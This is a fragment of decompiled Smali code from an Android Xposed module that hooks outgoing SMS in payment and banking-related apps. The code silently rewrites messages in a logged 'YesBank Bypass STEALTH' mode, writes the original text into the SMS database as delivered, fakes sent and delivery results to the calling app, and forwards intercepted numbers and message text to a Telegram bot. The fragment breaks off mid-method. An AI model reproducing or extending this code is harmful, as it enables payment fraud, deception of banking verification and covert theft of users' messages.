    .line 181
    .local v15, "sourceApp":Ljava/lang/String;
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "SmsHook: Intercepting SMS to: "

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v8, " from: "

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v8, " text: "

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 182
    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V

    .line 187
    iget-object v0, v1, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0}, Lcom/rebel/module/ConfigManager;->isYesBankBypassEnabled()Z

    move-result v0
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_7

    const-string v8, "com.twid.android"

    const-string v9, "in.magnetapp"

    const/4 v10, 0x0

    if-eqz v0, :cond_8

    :try_start_3
    invoke-virtual {v9, v15}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_8

    .line 188
    invoke-virtual {v8, v15}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_7

    .line 189
    move-object v0, v2

    .line 190
    .local v0, "modifiedMessage":Ljava/lang/String;
    if-eqz v2, :cond_5

    invoke-virtual {v2, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_5

    .line 191
    invoke-virtual {v2, v4, v3}, Ljava/lang/String;->replaceFirst(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object v9, v0

    goto :goto_0

    .line 192
    :cond_5
    if-eqz v2, :cond_6

    invoke-virtual {v2, v3}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_6

    .line 194
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "YESSRCD "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object v9, v0

    goto :goto_0

    .line 197
    :cond_6
    move-object v9, v0

    .end local v0    # "modifiedMessage":Ljava/lang/String;
    .local v9, "modifiedMessage":Ljava/lang/String;
    :goto_0
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "SmsHook: YesBank Bypass STEALTH ACTIVE - injecting original into DB and silently sending: "

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_7

    .line 205
    :try_start_4
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v6
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    .line 206
    .local v6, "smsManager":Landroid/telephony/SmsManager;
    move-object v3, v10

    const/4 v10, 0x0

    const/4 v11, 0x0

    const/4 v8, 0x0

    :try_start_5
    invoke-virtual/range {v6 .. v11}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_0

    move-object v4, v7

    move-object/from16 v16, v9

    .line 209
    .end local v6    # "smsManager":Landroid/telephony/SmsManager;
    .end local v7    # "destNumber":Ljava/lang/String;
    .end local v9    # "modifiedMessage":Ljava/lang/String;
    .local v4, "destNumber":Ljava/lang/String;
    .local v16, "modifiedMessage":Ljava/lang/String;
    goto :goto_2

    .line 207
    .end local v4    # "destNumber":Ljava/lang/String;
    .end local v16    # "modifiedMessage":Ljava/lang/String;
    .restart local v7    # "destNumber":Ljava/lang/String;
    .restart local v9    # "modifiedMessage":Ljava/lang/String;
    :catch_0
    move-exception v0

    goto :goto_1

    :catch_1
    move-exception v0

    move-object v3, v10

    :goto_1
    move-object v4, v7

    move-object/from16 v16, v9

    .line 208
    .end local v7    # "destNumber":Ljava/lang/String;
    .end local v9    # "modifiedMessage":Ljava/lang/String;
    .local v0, "e":Ljava/lang/Exception;
    .restart local v4    # "destNumber":Ljava/lang/String;
    .restart local v16    # "modifiedMessage":Ljava/lang/String;
    :try_start_6
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "SmsHook: Failed to send stealth SMS: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V

    .line 212
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_2
    invoke-direct {v1, v4, v2, v15}, Lcom/rebel/module/XposedHook;->logInterceptedSms(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)J

    move-result-wide v10

    .line 213
    .local v10, "logId":J
    iget-object v0, v1, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0}, Lcom/rebel/module/ConfigManager;->getBotToken()Ljava/lang/String;

    move-result-object v5

    .line 214
    .local v5, "botToken":Ljava/lang/String;
    iget-object v0, v1, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0}, Lcom/rebel/module/ConfigManager;->getChatId()Ljava/lang/String;

    move-result-object v6
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_7

    .line 218
    .local v6, "chatId":Ljava/lang/String;
    :try_start_7
    iget-object v0, v1, Lcom/rebel/module/XposedHook;->context:Landroid/content/Context;

    invoke-static {v0, v4, v2}, Lcom/rebel/module/SmsContentInserter;->insertSentAsDelivered(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_3

    .line 221
    .local v0, "success":Z
    move-object v7, v13

    move-object v8, v14

    move-object v9, v15

    move-object v13, v3

    move-object v3, v4

    move-object v4, v2

    move v2, v0

    .end local v0    # "success":Z
    .end local v13    # "sentIntent":Landroid/app/PendingIntent;
    .end local v14    # "deliveryIntent":Landroid/app/PendingIntent;
    .end local v15    # "sourceApp":Ljava/lang/String;
    .local v2, "success":Z
    .local v3, "destNumber":Ljava/lang/String;
    .local v4, "message":Ljava/lang/String;
    .local v7, "sentIntent":Landroid/app/PendingIntent;
    .local v8, "deliveryIntent":Landroid/app/PendingIntent;
    .local v9, "sourceApp":Ljava/lang/String;
    :try_start_8
    invoke-direct/range {v1 .. v11}, Lcom/rebel/module/XposedHook;->handleSmsResult(ZLjava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;Ljava/lang/String;J)V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_2

    .line 227
    .end local v2    # "success":Z
    move-object/from16 v1, p0

    move-object v2, v8

    move-object v8, v5

    move-object/from16 v20, v9

    move-object v9, v6

    move-wide v5, v10

    move-object/from16 v10, v20

    goto :goto_4

    .line 223
    :catch_2
    move-exception v0

    goto :goto_3

    .end local v3    # "destNumber":Ljava/lang/String;
    .end local v7    # "sentIntent":Landroid/app/PendingIntent;
    .end local v8    # "deliveryIntent":Landroid/app/PendingIntent;
    .end local v9    # "sourceApp":Ljava/lang/String;
    .local v2, "message":Ljava/lang/String;
    .local v4, "destNumber":Ljava/lang/String;
    .restart local v13    # "sentIntent":Landroid/app/PendingIntent;
    .restart local v14    # "deliveryIntent":Landroid/app/PendingIntent;
    .restart local v15    # "sourceApp":Ljava/lang/String;
    :catch_3
    move-exception v0

    move-object v7, v13

    move-object v8, v14

    move-object v9, v15

    move-object v13, v3

    move-object v3, v4

    move-object v4, v2

    .line 224
    .end local v2    # "message":Ljava/lang/String;
    .end local v13    # "sentIntent":Landroid/app/PendingIntent;
    .end local v14    # "deliveryIntent":Landroid/app/PendingIntent;
    .end local v15    # "sourceApp":Ljava/lang/String;
    .local v0, "e":Ljava/lang/Exception;
    .restart local v3    # "destNumber":Ljava/lang/String;
    .local v4, "message":Ljava/lang/String;
    .restart local v7    # "sentIntent":Landroid/app/PendingIntent;
    .restart local v8    # "deliveryIntent":Landroid/app/PendingIntent;
    .restart local v9    # "sourceApp":Ljava/lang/String;
    :goto_3
    :try_start_9
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "SmsHook: Error in stealth SMS handling: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_4

    .line 225
    const/4 v2, 0x0

    move-object/from16 v1, p0

    :try_start_a
    invoke-direct/range {v1 .. v11}, Lcom/rebel/module/XposedHook;->handleSmsResult(ZLjava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;Ljava/lang/String;J)V

    move-object v2, v8

    move-object v8, v5

    move-object/from16 v20, v9

    move-object v9, v6

    move-wide v5, v10

    move-object/from16 v10, v20

    .line 230
    .end local v0    # "e":Ljava/lang/Exception;
    .end local v6    # "chatId":Ljava/lang/String;
    .local v2, "deliveryIntent":Landroid/app/PendingIntent;
    .local v5, "logId":J
    .local v8, "botToken":Ljava/lang/String;
    .local v9, "chatId":Ljava/lang/String;
    .local v10, "sourceApp":Ljava/lang/String;
    :goto_4
    invoke-virtual {v12, v13}, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->setResult(Ljava/lang/Object;)V

    .line 231
    return-void

    .line 308
    .end local v2    # "deliveryIntent":Landroid/app/PendingIntent;
    .end local v3    # "destNumber":Ljava/lang/String;
    .end local v4    # "message":Ljava/lang/String;
    .end local v5    # "logId":J
    .end local v7    # "sentIntent":Landroid/app/PendingIntent;
    .end local v8    # "botToken":Ljava/lang/String;
    .end local v9    # "chatId":Ljava/lang/String;
    .end local v10    # "sourceApp":Ljava/lang/String;
    .end local v16    # "modifiedMessage":Ljava/lang/String;
    :catch_4
    move-exception v0

    move-object/from16 v1, p0

    goto/16 :goto_c

    .line 188
    .local v2, "message":Ljava/lang/String;
    .local v7, "destNumber":Ljava/lang/String;
    .restart local v13    # "sentIntent":Landroid/app/PendingIntent;
    .restart local v14    # "deliveryIntent":Landroid/app/PendingIntent;
    .restart local v15    # "sourceApp":Ljava/lang/String;
    :cond_7
    move-object v4, v2

    move-object v3, v7

    move-object v7, v13

    move-object v2, v14

    move-object v13, v10

    move-object v10, v15

    .end local v13    # "sentIntent":Landroid/app/PendingIntent;
    .end local v14    # "deliveryIntent":Landroid/app/PendingIntent;
    .end local v15    # "sourceApp":Ljava/lang/String;
    .local v2, "deliveryIntent":Landroid/app/PendingIntent;
    .restart local v3    # "destNumber":Ljava/lang/String;
    .restart local v4    # "message":Ljava/lang/String;
    .local v7, "sentIntent":Landroid/app/PendingIntent;
    .restart local v10    # "sourceApp":Ljava/lang/String;
    goto :goto_5

    .line 187
    .end local v3    # "destNumber":Ljava/lang/String;
    .end local v4    # "message":Ljava/lang/String;
    .end local v10    # "sourceApp":Ljava/lang/String;
    .local v2, "message":Ljava/lang/String;
    .local v7, "destNumber":Ljava/lang/String;
    .restart local v13    # "sentIntent":Landroid/app/PendingIntent;
    .restart local v14    # "deliveryIntent":Landroid/app/PendingIntent;
    .restart local v15    # "sourceApp":Ljava/lang/String;
    :cond_8
    move-object v4, v2

    move-object v3, v7

    move-object v7, v13

    move-object v2, v14

    move-object v13, v10

    move-object v10, v15

    .line 237
    .end local v13    # "sentIntent":Landroid/app/PendingIntent;
    .end local v14    # "deliveryIntent":Landroid/app/PendingIntent;
    .end local v15    # "sourceApp":Ljava/lang/String;
    .local v2, "deliveryIntent":Landroid/app/PendingIntent;
    .restart local v3    # "destNumber":Ljava/lang/String;
    .restart local v4    # "message":Ljava/lang/String;
    .local v7, "sentIntent":Landroid/app/PendingIntent;
    .restart local v10    # "sourceApp":Ljava/lang/String;
    :goto_5
    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_b

    invoke-virtual {v8, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_b

    const-string v0, "omnicash.rio.app"

    .line 238
    invoke-virtual {v0, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_9

    move-object v14, v2

    move-object v9, v3

    move-object v11, v7

    move-object v15, v10

    move-object v10, v4

    goto/16 :goto_8

    .line 278
    :cond_9
    invoke-direct {v1, v3}, Lcom/rebel/module/XposedHook;->isNumberAllowed(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_a

    .line 281
    invoke-direct {v1, v3, v4, v10}, Lcom/rebel/module/XposedHook;->logBlockedSms(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 282
    invoke-virtual {v12, v13}, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->setResult(Ljava/lang/Object;)V

    .line 283
    return-void

    .line 287
    :cond_a
    invoke-direct {v1, v3, v4, v10}, Lcom/rebel/module/XposedHook;->logInterceptedSms(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)J

    move-result-wide v5

    .line 289
    .restart local v5    # "logId":J
    iget-object v0, v1, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0}, Lcom/rebel/module/ConfigManager;->getBotToken()Ljava/lang/String;

    move-result-object v0

    move-object v8, v0

    .line 290
    .restart local v8    # "botToken":Ljava/lang/String;
    iget-object v0, v1, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0}, Lcom/rebel/module/ConfigManager;->getChatId()Ljava/lang/String;

    move-result-object v0
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_7

    move-object v9, v0

    .line 293
    .restart local v9    # "chatId":Ljava/lang/String;
    :try_start_b
    iget-object v0, v1, Lcom/rebel/module/XposedHook;->context:Landroid/content/Context;

    invoke-static {v0, v3, v4}, Lcom/rebel/module/SmsContentInserter;->insertSentAsDelivered(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_6

    .line 296
    .local v0, "success":Z
    move-wide/from16 v20, v5

    move-object v6, v9

    move-object v9, v10

    move-wide/from16 v10, v20

    move-object v5, v8

    move-object v8, v2

    move v2, v0

    .end local v0    # "success":Z
    .local v2, "success":Z
    .local v5, "botToken":Ljava/lang/String;
    .restart local v6    # "chatId":Ljava/lang/String;
    .local v8, "deliveryIntent":Landroid/app/PendingIntent;
    .local v9, "sourceApp":Ljava/lang/String;
    .local v10, "logId":J
    :try_start_c
    invoke-direct/range {v1 .. v11}, Lcom/rebel/module/XposedHook;->handleSmsResult(ZLjava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;Ljava/lang/String;J)V
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_5

    .line 303
    .end local v2    # "success":Z
    move-object/from16 v1, p0

    move-object v2, v5

    move-object v14, v8

    move-object v15, v9

    move-object v9, v3

    move-object v3, v6

    move-wide v5, v10

    move-object v10, v4

    move-object v11, v7

    goto :goto_7

    .line 298
    :catch_5
    move-exception v0

    goto :goto_6

    .end local v6    # "chatId":Ljava/lang/String;
    .local v2, "deliveryIntent":Landroid/app/PendingIntent;
    .local v5, "logId":J
    .local v8, "botToken":Ljava/lang/String;
    .local v9, "chatId":Ljava/lang/String;
    .local v10, "sourceApp":Ljava/lang/String;
    :catch_6
    move-exception v0

    move-wide/from16 v20, v5

    move-object v6, v9

    move-object v9, v10

    move-wide/from16 v10, v20

    move-object v5, v8

    move-object v8, v2

    .line 301
    .end local v2    # "deliveryIntent":Landroid/app/PendingIntent;
    .local v0, "e":Ljava/lang/Exception;
    .local v5, "botToken":Ljava/lang/String;
    .restart local v6    # "chatId":Ljava/lang/String;
    .local v8, "deliveryIntent":Landroid/app/PendingIntent;
    .local v9, "sourceApp":Ljava/lang/String;
    .local v10, "logId":J
    :goto_6
    const/4 v2, 0x0

    move-object/from16 v1, p0

    :try_start_d
    invoke-direct/range {v1 .. v11}, Lcom/rebel/module/XposedHook;->handleSmsResult(ZLjava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;Ljava/lang/String;J)V

    move-object v2, v5

    move-object v14, v8

    move-object v15, v9

    move-object v9, v3

    move-object v3, v6

    move-wide v5, v10

    move-object v10, v4

    move-object v11, v7

    .line 305
    .end local v0    # "e":Ljava/lang/Exception;
    .end local v4    # "message":Ljava/lang/String;
    .end local v6    # "chatId":Ljava/lang/String;
    .end local v7    # "sentIntent":Landroid/app/PendingIntent;
    .end local v8    # "deliveryIntent":Landroid/app/PendingIntent;
    .local v2, "botToken":Ljava/lang/String;
    .local v3, "chatId":Ljava/lang/String;
    .local v5, "logId":J
    .local v9, "destNumber":Ljava/lang/String;
    .local v10, "message":Ljava/lang/String;
    .local v11, "sentIntent":Landroid/app/PendingIntent;
    .restart local v14    # "deliveryIntent":Landroid/app/PendingIntent;
    .restart local v15    # "sourceApp":Ljava/lang/String;
    :goto_7
    invoke-virtual {v12, v13}, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->setResult(Ljava/lang/Object;)V
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_7

    .line 311
    .end local v2    # "botToken":Ljava/lang/String;
    .end local v3    # "chatId":Ljava/lang/String;
    .end local v5    # "logId":J
    .end local v9    # "destNumber":Ljava/lang/String;
    .end local v10    # "message":Ljava/lang/String;
    .end local v11    # "sentIntent":Landroid/app/PendingIntent;
    .end local v14    # "deliveryIntent":Landroid/app/PendingIntent;
    .end local v15    # "sourceApp":Ljava/lang/String;
    goto/16 :goto_c

    .line 237
    .local v2, "deliveryIntent":Landroid/app/PendingIntent;
    .local v3, "destNumber":Ljava/lang/String;
    .restart local v4    # "message":Ljava/lang/String;
    .restart local v7    # "sentIntent":Landroid/app/PendingIntent;
    .local v10, "sourceApp":Ljava/lang/String;
    :cond_b
    move-object v14, v2

    move-object v9, v3

    move-object v11, v7

    move-object v15, v10

    move-object v10, v4

    .line 240
    .end local v2    # "deliveryIntent":Landroid/app/PendingIntent;
    .end local v3    # "destNumber":Ljava/lang/String;
    .end local v4    # "message":Ljava/lang/String;
    .end local v7    # "sentIntent":Landroid/app/PendingIntent;
    .restart local v9    # "destNumber":Ljava/lang/String;
    .local v10, "message":Ljava/lang/String;
    .restart local v11    # "sentIntent":Landroid/app/PendingIntent;
    .restart local v14    # "deliveryIntent":Landroid/app/PendingIntent;
    .restart local v15    # "sourceApp":Ljava/lang/String;
    :goto_8
    const/4 v2, 0x0

    .line 242
    .local v2, "srcPrefix":Z
    :try_start_e
    iget-object v0, v1, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0}, Lcom/rebel/module/ConfigManager;->isZetSrcPrefixEnabled()Z

    move-result v0
    :try_end_e
    .catchall {:try_start_e .. :try_end_e} :catchall_0

    move v2, v0

    .line 244
    move v13, v2

    goto :goto_9

    .line 243
    :catchall_0
    move-exception v0

    move v13, v2

    .line 245
    .end local v2    # "srcPrefix":Z
    .local v13, "srcPrefix":Z
    :goto_9
    if-eqz v13, :cond_c

    .line 246
    :try_start_f
    iget-object v0, v12, Lde/robv/android/xposed/XC_MethodHook$MethodHookParam;->args:[Ljava/lang/Object;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    aput-object v2, v0, v5

    .line 247
    const-string v0, "SmsHook: Zet/Twid SMS passthrough \u2014 prefixed SRC_ and letting SMS send + Telegram"

    .line 248
    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V

    goto :goto_a

    .line 250
    :cond_c
    const-string v0, "SmsHook: Zet/Twid SMS passthrough \u2014 letting SMS send normally + Telegram"

    invoke-static {v0}, Lde/robv/android/xposed/XposedBridge;->log(Ljava/lang/String;)V

    .line 253
    :goto_a
    invoke-direct {v1, v9, v10, v15}, Lcom/rebel/module/XposedHook;->logInterceptedSms(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)J

    move-result-wide v2

    move-wide/from16 v16, v2

    .line 254
    .local v16, "logId":J
    iget-object v0, v1, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0}, Lcom/rebel/module/ConfigManager;->getBotToken()Ljava/lang/String;

    move-result-object v2

    .line 255
    .local v2, "botToken":Ljava/lang/String;
    iget-object v0, v1, Lcom/rebel/module/XposedHook;->configManager:Lcom/rebel/module/ConfigManager;

    invoke-virtual {v0}, Lcom/rebel/module/ConfigManager;->getChatId()Ljava/lang/String;

    move-result-object v3

    .line 258
    .local v3, "chatId":Ljava/lang/String;
    if-eqz v2, :cond_d

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_d

    if-eqz v3, :cond_d

    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_d

    .line 259
    move-object v4, v9

    .line 260
    .local v4, "fDest":Ljava/lang/String;
    move-object v5, v10

    .line 261
    .local v5, "fMsg":Ljava/lang/String;
    move-object v6, v15

    .line 262
    .local v6, "fSrc":Ljava/lang/String;
    move-wide/from16 v7, v16

    .line 263
    .local v7, "fLogId":J
    new-instance v0, Ljava/lang/Thread;

    move-object/from16 v18, v0

    new-instance v0, Lcom/rebel/module/XposedHook$$ExternalSyntheticLambda2;

    move-object/from16 v19, v9

    move-object/from16 v9, v18

    .end local v9    # "destNumber":Ljava/lang/String;
    .local v19, "destNumber":Ljava/lang/String;
    invoke-direct/range {v0 .. v8}, Lcom/rebel/module/XposedHook$$ExternalSyntheticLambda2;-><init>(Lcom/rebel/module/XposedHook;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;J)V

    invoke-direct {v9, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 270
    invoke-virtual {v9}, Ljava/lang/Thread;->start()V
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_7

    goto :goto_b

    .line 258
    .end local v4    # "fDest":Ljava/lang/String;
    .end local v5    # "fMsg":Ljava/lang/String;
    .end local v6    # "fSrc":Ljava/lang/String;
    .end local v7    # "fLogId":J
    .end local v19    # "destNumber":Ljava/lang/String;
    .restart local v9    # "destNumber":Ljava/lang/String;
    :cond_d
    move-object/from16 v19, v9

    .line 274
    .end local v9    # "destNumber":Ljava/lang/String;
    .restart local v19    # "destNumber":Ljava/lang/String;
    :goto_b
    return-void

    .line 308
    .end local v2    # "botToken":Ljava/lang/String;
    .end local v3    # "chatId":Ljava/lang/String;
    .end local v10    # "message":Ljava/lang/String;
    .end local v11    # "sentIntent":Landroid/app/PendingIntent;
    .end local v13    # "srcPrefix":Z
    .end local v14    # "deliveryIntent":Landroid/app/PendingIntent;
    .end local v15    # "sourceApp":Ljava/lang/String;
    .end local v16    # "logId":J
    .end local v19    # "destNumber":Ljava/lang/String;
    :catch_7
    move-exception v0

    .line 312
    :goto_c
    return-void
.end method

.method private handleSmsResult(ZLjava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;Ljava/lang/String;J)V
    .locals 8
    .param p1, "success"    # Z
    .param p2, "destNumber"    # Ljava/lang/String;
    .param p3, "message"    # Ljava/lang/String;
    .param p4, "botToken"    # Ljava/lang/String;
    .param p5, "chatId"    # Ljava/lang/String;
    .param p6, "sentIntent"    # Landroid/app/PendingIntent;
    .param p7, "deliveryIntent"    # Landroid/app/PendingIntent;
    .param p8, "sourceApp"    # Ljava/lang/String;
    .param p9, "logId"    # J

    .line 105
    iput-object p2, p0, Lcom/rebel/module/XposedHook;->lastSmsDestNumber:Ljava/lang/String;

    .line 108
    invoke-virtual {p4}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_0

    invoke-virtual {p5}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_0

    .line 109
    move-object v0, p0

    move-object v3, p2

    move-object v4, p3

    move-object v1, p4

    move-object v2, p5

    move-object/from16 v5, p8

    move-wide/from16 v6, p9

    invoke-direct/range {v0 .. v7}, Lcom/rebel/module/XposedHook;->sendTelegramNotification(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;J)V

    .line 110
    move-wide/from16 v5, p9

    invoke-direct/range {v0 .. v6}, Lcom/rebel/module/XposedHook;->addToBatch(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;J)V

    .line 114
    :cond_0
    const-string v1, "sent"

    const/4 v2, -0x1

    invoke-direct {p0, p6, v2, v1}, Lcom/rebel/module/XposedHook;->firePendingIntentWithResultCode(Landroid/app/PendingIntent;ILjava/lang/String;)V

    .line 115
    const-string v1, "delivery"

    invoke-direct {p0, p7, v2, v1}, Lcom/rebel/module/XposedHook;->firePendingIntentWithResultCode(Landroid/app/PendingIntent;ILjava/lang/String;)V

    .line 116
    invoke-direct {p0, p2, v2}, Lcom/rebel/module/XposedHook;->fireDirectSmsBroadcast(Ljava/lang/String;I)V

    .line 117
    return-void
.end method

.method private hookCursorSmsReads(Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;)V
    .locals 3
    .param p1, "lpparam"    # Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;

    .line 576
    const-string v0, "getString"

    :try_start_0
    const-string v1, "android.database.CursorWrapper"

    iget-object v2, p1, Lde/robv/android/xposed/callbacks/XC_LoadPackage$LoadPackageParam;->classLoader:Ljava/lang/ClassLoader;

    .line 577
    invoke-static {v1, v2}, Lde/robv/android/xposed/XposedHelpers;->findClass(Ljava/lang/String;Ljava/lang/ClassLoader;)Ljava/lang/Class;

    move-result-object v1

    new-instance v2, Lcom/rebel/module/XposedHook$7;

    invoke-direct {v2, p0}, Lcom/rebel/module/XposedHook$7;-><init>(Lcom/rebel/module/XposedHook;)V

    .line 576
